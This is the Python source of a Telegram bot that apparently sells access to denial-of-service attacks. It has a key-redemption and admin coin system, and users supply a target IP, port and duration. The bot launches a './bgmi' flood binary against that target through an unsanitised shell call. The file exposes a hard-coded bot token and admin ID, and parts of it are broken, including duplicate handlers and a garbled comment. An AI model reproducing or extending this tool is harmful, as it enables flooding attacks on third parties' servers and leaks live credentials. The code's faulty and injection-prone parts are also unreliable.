import os
import json
import time
import random
import string
import telebot
import datetime
import calendar
import subprocess
import threading
from telebot import types
from dateutil.relativedelta import relativedelta
import time

# Idef create_random_key()nsert your Telegram bot token here
bot = telebot.TeleBot('7519734348:AAFoQEvymQXUcyhqSYPztIE9cwCiwp-ZGcU')

# Admin user IDs
admin_id = {"708030615"}

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
record_command_logs = "some text"
string_variable = "some text"  # ✅ This won't cause conflicts

MAX_ATTACK_TIME = 300  # Example: Default maximum attack time set to 300 seconds

# In-memory storage
users = {}
keys = {}
last_attack_time = {}

# Load data from files
def load_data():
    global users, keys
    users = read_users()
    keys = read_keys()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def create_random_key():
    key = "NOOBAM-" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
    keys[key] = {"status": "valid"}
    save_keys()
    return key

def log_command(user_id, target, port, attack_time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def clear_logs():
    try:
        with open(LOG_FILE, "w") as file:
            file.truncate(0)
        return "Logs cleared ✅"
    except FileNotFoundError:
        return "No data found."

@bot.message_handler(func=lambda message: message.text == "🎟️ Redeem Key")
def redeem_key(message):
    bot.reply_to(message, "🔑 Please enter your key:")
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    key = message.text.strip()
    if key in keys and keys[key]["status"] == "valid":
        keys[key]["status"] = "redeemed"
        save_keys()
        users[str(message.chat.id)] = (datetime.datetime.now() + relativedelta(days=1)).strftime('%Y-%m-%d %H:%M:%S')
        save_users()
        bot.reply_to(message, "✅ Key Redeemed Successfully! You now have access.")
    else:
        bot.reply_to(message, "📛 Invalid or Expired Key 📛")
        




# Users Command
@bot.message_handler(func=lambda message: message.text == "📜 Users")
def list_users(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔ Access Denied: Admins only.")
        return
    if not users:
        bot.reply_to(message, "⚠ No users found.")
        return
    response = "✅ *Registered Users* ✅\n\n" + "\n".join([f"🆔 {user}" for user in users])
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "🎟️ Redeem Key")
def process_redeem_key(message):
    key = message.text.strip()
    if key in keys and keys[key]["status"] == "valid":
        keys[key]["status"] = "redeemed"
        save_keys()
        
        expiration_date = (datetime.datetime.now() + relativedelta(days=1)).strftime('%Y-%m-%d %H:%M:%S')
        users[str(message.chat.id)] = expiration_date
        save_users()
        
        bot.reply_to(message, "✅ Key Redeemed Successfully! You now have access.")
    else:
        bot.reply_to(message, "📛 Invalid or Expired Key 📛")

@bot.message_handler(commands=['start'])
def start_command(message):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    attack_button = types.KeyboardButton("🚀 Attack")
    myinfo_button = types.KeyboardButton("👤 My Info")
    redeem_button = types.KeyboardButton("🎟️ Redeem Key")
    bot_sitting_button = types.KeyboardButton("🤖 BOT SITTING")
    assasmin = types.KeyboardButton("addadmin")
    admin_panel_button = types.KeyboardButton("🔧 ADMIN_PANEL")
    if str(message.chat.id) in admin_id:
        markup.add(admin_panel_button)
    markup.add(attack_button, myinfo_button, redeem_button,  bot_sitting_button)
    bot.reply_to(message, "𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝐍𝐎𝐎𝐁 𝐀𝐌 𝐃𝐃𝐎𝐒 𝐖𝐎𝐑𝐋𝐃!", reply_markup=markup)
    
admin_id = {"708030615"}  # Existing admin IDs
users = {}
coins = {}

# Command to Add New Admin
@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔ Access Denied: Only existing admins can add new admins.")
        return
    
    # Extract new admin ID from the message
    new_admin_id = message.text.split()[1]  # Expecting /addadmin <new_admin_id>
    if new_admin_id not in admin_id:
        admin_id.add(new_admin_id)
        bot.reply_to(message, f"✅ New admin {new_admin_id} added successfully!")
        
        # Give new admin some coins
        if new_admin_id not in coins:
            coins[new_admin_id] = 100  # Initial coin allocation
    else:
        bot.reply_to(message, "⚠ This user is already an admin.")

# Command to Add Users (with coin deduction from admin)
@bot.message_handler(commands=['adduser'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔ Access Denied: Only admins can add users.")
        return
    
    # Check if admin has enough coins
    if coins.get(user_id, 0) < 20:  # Deduct 20 coins for each user added
        bot.reply_to(message, "⚠️ You do not have enough coins to add a new user.")
        return

    # Deduct 20 coins for adding a user
    coins[user_id] -= 20

    # Get the user ID and duration for the new user
    try:
        args = message.text.split()
        new_user_id = args[1]
        duration = args[2]  # Example: '1hour', '1day', '7days', etc.

        # Add user with expiration time based on duration
        expiration_date = get_expiration_date(duration)
        users[new_user_id] = expiration_date

        bot.reply_to(message, f"✅ User {new_user_id} added successfully with {duration} access.")

    except IndexError:
        bot.reply_to(message, "⚠️ Invalid format. Use: /adduser <user_id> <duration>")

def get_expiration_date(duration):
    current_time = datetime.datetime.now()
    if duration == "1hour":
        return (current_time + datetime.timedelta(hours=1)).strftime('%Y-%m-%d %H:%M:%S')
    elif duration == "1day":
        return (current_time + datetime.timedelta(days=1)).strftime('%Y-%m-%d %H:%M:%S')
    elif duration == "7days":
        return (current_time + datetime.timedelta(days=7)).strftime('%Y-%m-%d %H:%M:%S')
    elif duration == "3days":
        return (current_time + datetime.timedelta(days=3)).strftime('%Y-%m-%d %H:%M:%S')
    elif duration == "15days":
        return (current_time + datetime.timedelta(days=15)).strftime('%Y-%m-%d %H:%M:%S')
    else:
        return None



@bot.message_handler(func=lambda message: message.text == "🤖 BOT SITTING")
def bot_sitting(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔ Access Denied: Admins only.")
        return

    bot_sitting_markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    set_time_button = types.KeyboardButton("🕒 Set Attack Time")
    back_button = types.KeyboardButton("⬅ Back")

    bot_sitting_markup.add(set_time_button, back_button)
    bot.reply_to(message, "🤖 BOT SITTING Menu:\nSelect an option:", reply_markup=bot_sitting_markup)

@bot.message_handler(func=lambda message: message.text == "🕒 Set Attack Time")
def prompt_set_attack_time(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔ Access Denied: Admins only.")
        return

    bot.reply_to(message, f"🕒 Enter the new maximum attack time in seconds (current: {MAX_ATTACK_TIME}s):")
    bot.register_next_step_handler(message, process_set_attack_time)

def process_set_attack_time(message):
    global MAX_ATTACK_TIME
    user_id = str(message.chat.id)

    if user_id not in admin_id:
        bot.reply_to(message, "⛔ Access Denied: Admins only.")
        return

    try:
        new_time = int(message.text.strip())
        if new_time <= 0:
            bot.reply_to(message, "⚠ Invalid time! Must be greater than 0.")
        else:
            MAX_ATTACK_TIME = new_time
            bot.reply_to(message, f"✅ Maximum attack time updated to {MAX_ATTACK_TIME} seconds!")
    except ValueError:
        bot.reply_to(message, "⚠ Invalid input! Please enter a valid number.")

@bot.message_handler(func=lambda message: message.text == "🔧 ADMIN_PANEL")
def admin_panel(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔ Access Denied: Admins only.")
        return

    admin_markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    users_button = types.KeyboardButton("📜 Users")
    gen_key_button = types.KeyboardButton("🔑 GenKey")
    remove_user_button = types.KeyboardButton("REMOVE USER")  # ✅ NEW BUTTON
    back_button = types.KeyboardButton("⬅ Back")

    admin_markup.add(users_button, gen_key_button, remove_user_button, back_button)
    bot.reply_to(message, "🔧 *Admin Panel Opened* 🔧\nSelect an option:", reply_markup=admin_markup, parse_mode="Markdown")

# ✅ New handler for removing users
@bot.message_handler(func=lambda message: message.text == "REMOVE USER")
def remove_user_prompt(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔ Access Denied: Admins only.")
        return

    bot.reply_to(message, "🗑️ Enter the User ID you want to remove:")
    bot.register_next_step_handler(message, process_remove_user)

def process_remove_user(message):
    user_id = str(message.text.strip())

    if user_id in users:
        del users[user_id]
        save_users()
        bot.reply_to(message, f"✅ User {user_id} has been removed successfully!")
    else:
        bot.reply_to(message, "⚠️ User ID not found in the system.")

# Back Button Command
@bot.message_handler(func=lambda message: message.text == "⬅ Back")
def back_to_main_menu(message):
    start_command(message)  # Calls the start function again to reset the menu

# GenKey Command with Inline Buttons
@bot.message_handler(func=lambda message: message.text == "🔑 GenKey")
def genkey_command(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔ Access Denied: Admins only.")
        return
    markup = types.InlineKeyboardMarkup(row_width=2)
    durations = ["1hour", "5hours", "1day", "3days", "7days", "15days"]
    for duration in durations:
        markup.add(types.InlineKeyboardButton(text=duration, callback_data=f"genkey_{duration}"))
    bot.reply_to(message, "🔑 *Select Key Duration:*", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("genkey_"))
def process_genkey(call):
    user_id = str(call.message.chat.id)
    duration = call.data.split("_")[1]
    if user_id not in admin_id:
        bot.answer_callback_query(call.id, "⛔ Access Denied.")
        return
    key = create_random_key()
    bot.send_message(call.message.chat.id, f"✅ *Generated Key:* `{key}`\n⏳ Duration: {duration}", parse_mode="Markdown")

COOLDOWN_PERIOD = 60  # 1-minute cooldown
@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def handle_attack(message):
    user_id = str(message.chat.id)

    if user_id in users and users[user_id]:  # Ensure user has valid expiration
        try:
            expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        except ValueError:
            bot.reply_to(message, "⚠️ Error: Invalid date format. Contact Admin.")
            return

        if datetime.datetime.now() > expiration:
            bot.reply_to(message, "❗ Your access has expired. Contact the admin to renew ❗")
            return

        # Check if cooldown period has passed
        if user_id in last_attack_time:
            time_since_last_attack = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
            if time_since_last_attack < COOLDOWN_PERIOD:
                remaining_cooldown = COOLDOWN_PERIOD - time_since_last_attack
                response = f"⌛️ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗶𝗻 𝗲𝗳𝗳𝗲𝗰𝘁 𝘄𝗮𝗶𝘁 {int(remaining_cooldown)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
                bot.reply_to(message, response)
                return  # Prevent the attack from proceeding

        # Prompt the user for attack details
        response = "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝗽, 𝗽𝗼𝗿𝘁 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲"
        bot.reply_to(message, response)
        bot.register_next_step_handler(message, process_attack_details)

    else:
        response = "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! ⛔️\n\n OWNER :- @NOOB_AM !"
        bot.reply_to(message, response)

def process_attack_details(message):
    user_id = str(message.chat.id)
    details = message.text.split()
    
    response = "Invalid format"  # Initialize response  

    if len(details) == 3:
        target = details[0]
        try:
            port = int(details[1])
            attack_time = int(details[2])  # ✅ Renamed from 'time' to 'attack_time'

            if attack_time > MAX_ATTACK_TIME:
                response = f"❗️ Error: Maximum allowed attack time is {MAX_ATTACK_TIME} seconds!"
            else:
                # Log the attack with correct variable name
                log_command(user_id, target, port, attack_time)
                full_command = f"./bgmi {target} {port} {attack_time} 999 999"  # ✅ Correct variable name

                username = message.chat.username or "No username"

                response = (
                    f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n"
                    f"𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n"
                    f"𝗧𝗶𝗺𝗲: {attack_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n"
                    f"𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: @{username}"
                )

                # Execute the attack command
                subprocess.Popen(full_command, shell=True)

                # Schedule a message after the attack duration
                threading.Timer(attack_time, send_attack_finished_message, [message.chat.id, message.message_id, target, port, attack_time]).start()

                last_attack_time[user_id] = datetime.datetime.now()

        except ValueError:
            response = "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 𝗼𝗿 𝘁𝗶𝗺𝗲 𝗳𝗼𝗿𝗺𝗮𝘁."
    else:
        response = "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁"
        
    bot.reply_to(message, response)

def send_attack_finished_message(chat_id, message_id, target, port, attack_time):
    """Notify the user that the attack is finished in a bold and powerful way, with a reply to the attack message."""
    
    message = (
        "🔥 **ATTACK COMPLETED!** 🔥\n\n"
        f"🎯 **TARGET:** **`{target}:{port}`**\n"
        f"⏳ **DURATION:** **`{attack_time} SECONDS`**\n"
        "💀 **STATUS:** **`SUCCESS!`**\n\n"
        "💀 **MISSION SUCCESS!** 💀"
    )
    
    bot.send_message(chat_id, message, parse_mode="Markdown", reply_to_message_id=message_id)
    
@bot.message_handler(func=lambda message: message.text == "👤 My Info")
def my_info(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"

    if user_id in admin_id:
        role = "Admin"
        expiration = "Unlimited"
        remaining_time = "Unlimited"
    elif user_id in users:
        role = "User"
        expiration = users.get(user_id, "Expired")  # Get expiration, default to "Expired"
        remaining_time = get_remaining_time(expiration) if expiration != "Expired" else "Expired"
    else:
        role = "Guest"
        expiration = "No access"
        remaining_time = "No access"

    response = (
        f"👤 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 👤\n\n"
        f"ℹ️ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username}\n"
        f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗: {user_id}\n"
        f"🚹 𝗥𝗼𝗹𝗲: {role}\n"
        f"🕘 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: {expiration}\n"
        f"⏳ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗧𝗶𝗺𝗲: {remaining_time}\n"
    )
    bot.reply_to(message, response)

    
@bot.message_handler(commands=['users'])
def list_authorized_users(message):
    user_id = str(message.chat.id)

    # Ensure only admins can use this command
    if user_id not in admin_id:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")
        return

    if users:
        response = "✅ 𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗨𝘀𝗲𝗿𝘀 ✅\n\n"
        for user, expiration in users.items():
            expiration_date = datetime.datetime.strptime(expiration, '%Y-%m-%d %H:%M:%S')
            formatted_expiration = expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            
            # Fetch user info to get either username or first name
            user_info = bot.get_chat(user)
            username = user_info.username if user_info.username else user_info.first_name
            
            response += f"• 𝗨𝘀𝗲𝗿 𝗜𝗗: {user}\n  𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username}\n  𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗢𝗻: {formatted_expiration}\n\n"
    else:
        response = "⚠️ 𝗡𝗼 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘂𝘀𝗲𝗿𝘀 𝗳𝗼𝘂𝗻𝗱."

    bot.reply_to(message, response, parse_mode='Markdown')
    
if __name__ == "__main__":
    load_data()
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(e)  # Print the error for debugging
        
        attack_time = 60  # ✅ Renamed from `time` to avoid conflicts

        # Fix for 'time' being undefined
        try:
            del time  # ✅ Remove any overwritten `time` variable
        except NameError:
            pass  # ✅ If `time` was never overwritten, do nothing

        import time  # ✅ Re-import `time` to restore it
        time.sleep(1)  # ✅ Now works correctly
